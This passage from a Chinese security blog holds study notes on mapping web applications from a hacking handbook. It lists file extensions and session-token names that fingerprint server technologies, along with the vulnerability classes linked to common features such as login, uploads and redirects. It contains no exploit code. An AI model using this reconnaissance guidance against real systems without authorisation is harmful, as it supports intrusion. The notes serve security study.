<li>d2w — WebSphere</li>
<li>d2w — WebSphere</li>
<li>py — The Python language</li>
<li>dll — Usually compiled native code (C or C++)</li>
<li>nsf or ntf — Lotus Domino</li>
</ul>
<h6 id="会话令牌"><a href="#会话令牌" class="headerlink" title="会话令牌"></a>会话令牌</h6><ul>
<li>JSESSIONID — The Java Platform</li>
<li>ASPSESSIONID — Microsoft IIS server</li>
<li>ASP.NET_SessionId — Microsoft ASP.NET</li>
<li>CFID/CFTOKEN — Cold Fusion</li>
<li>PHPSESSID — PHP</li>
</ul>
<h6 id="第三方代码"><a href="#第三方代码" class="headerlink" title="第三方代码"></a>第三方代码</h6><p>比如，FASTJSON</p>
<h5 id="识别服务端功能"><a href="#识别服务端功能" class="headerlink" title="识别服务端功能"></a>识别服务端功能</h5><h6 id="分析请求"><a href="#分析请求" class="headerlink" title="分析请求"></a>分析请求</h6><h6 id="推测应用程序行为"><a href="#推测应用程序行为" class="headerlink" title="推测应用程序行为"></a>推测应用程序行为</h6><p>一般情况下，一个应用内很多功能是共通的，这点可以利用。</p>
<p>比如，可以利用类似 echo 功能的接口来推测应用所使用的消毒技术来进行 SQL 注入</p>
<h6 id="独特的部分"><a href="#独特的部分" class="headerlink" title="独特的部分"></a>独特的部分</h6><p>和上部分相反，假如某个部分和某应用主流风格不一致，那就可能是应用安全框架之外的漏网之鱼</p>
<h6 id="映射攻击面"><a href="#映射攻击面" class="headerlink" title="映射攻击面"></a>映射攻击面</h6><ul>
<li>Client-side validation — Checks may not be replicated on the server</li>
<li>Database interaction — SQL injection</li>
<li>File uploading and downloading — Path traversal vulnerabilities, stored cross-site scripting</li>
<li>Display of user-supplied data — Cross-site scripting</li>
<li>Dynamic redirects — Redirection and header injection attacks</li>
<li>Social networking features — username enumeration, stored cross-site scripting</li>
<li>Login — Username enumeration, weak passwords, ability to use brute force</li>
<li>Multistage login — Logic flaws</li>
<li>Session state — Predictable tokens, insecure handling of tokens</li>
<li>Access controls — Horizontal and vertical privilege escalation</li>
<li>User impersonation functions — Privilege escalation</li>
<li>Use of cleartext communications — Session hijacking, capture of credentials and other sensitive data</li>
<li>Off-site links — Leakage of query string parameters in the Referer header</li>
<li>Interfaces to external systems — Shortcuts in the handling of sessions and/or access controls</li>
<li>Error messages — Information leakage</li>
<li>E-mail interaction — E-mail and/or command injection</li>
<li>Native code components or interaction — Buffer overflows</li>
<li>Use of third-party application components — Known vulnerabilities</li>
<li>Identifiable web server software — Common configuration weaknesses, known software bugs</li>
</ul>
<h5 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h5>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/06/22/Web%20%E5%BA%94%E7%94%A8%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C/%E7%AC%AC%E5%9B%9B%E7%AB%A0%EF%BC%9A%E6%98%A0%E5%B0%84%E5%BA%94%E7%94%A8/" data-id="ckbxqp6f40007rsfe37bb9lnf" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/07/11/Web%20%E5%BA%94%E7%94%A8%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C/%E7%AC%AC%E5%8D%81%E4%B8%89%E7%AB%A0%EF%BC%9A%E6%94%BB%E5%87%BB%E7%94%A8%E6%88%B7%EF%BC%9A%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7/">Web 应用黑客手册/第十三章：攻击用户：其他技巧</a>
          </li>
        
          <li>
            <a href="/2020/07/09/Web%20%E5%BA%94%E7%94%A8%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C/%E7%AC%AC%E5%8D%81%E4%BA%8C%E7%AB%A0%EF%BC%9A%E6%94%BB%E5%87%BB%E7%94%A8%E6%88%B7%EF%BC%9A%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/">Web 应用黑客手册/第十二章：攻击用户：跨站脚本</a>
          </li>
        
          <li>
            <a href="/2020/07/01/Web%20%E5%BA%94%E7%94%A8%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C/%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0%EF%BC%9A%E6%94%BB%E5%87%BB%E5%BA%94%E7%94%A8%E9%80%BB%E8%BE%91/">Web 应用黑客手册/第十一章：攻击应用逻辑</a>
          </li>
        
          <li>
            <a href="/2020/06/27/Web%20%E5%BA%94%E7%94%A8%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C/%E7%AC%AC%E5%8D%81%E7%AB%A0%EF%BC%9A%E6%94%BB%E5%87%BB%E5%90%8E%E7%AB%AF%E7%BB%84%E4%BB%B6/">Web 应用黑客手册/第十章：攻击后端组件</a>
          </li>
        
          <li>
            <a href="/2020/06/26/Web%20%E5%BA%94%E7%94%A8%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C/%E7%AC%AC%E4%B9%9D%E7%AB%A0%EF%BC%9A%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/">Web 应用黑客手册/第九章：攻击数据存储</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>